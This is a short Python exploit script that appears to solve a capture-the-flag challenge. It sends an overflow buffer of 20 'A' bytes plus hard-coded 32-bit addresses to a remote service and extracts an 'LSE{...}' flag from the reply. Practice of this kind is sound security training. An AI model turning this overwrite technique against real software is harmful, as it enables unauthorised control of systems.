#!/usr/bin/python3

import sys
import socket
import re
import time

server = (sys.argv[1], int(sys.argv[2]))
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(server)

try:
  buf = (b'A' * 20) + b'\x30\xA0\x04\x08\n'
  sock.send(buf)
  buf = b'\x2B\x86\x04\x08\n'
  sock.send(buf)
  time.sleep(0.5)
  message = sock.recv(100, socket.MSG_DONTWAIT)

  print('FLAG: ' + re.search('LSE{.*}', message.decode('ascii')).group(0))
except:
  print('FLAG: ' + re.search('LSE{.*}', message.decode('ascii')).group(0))

finally:
  sock.close()
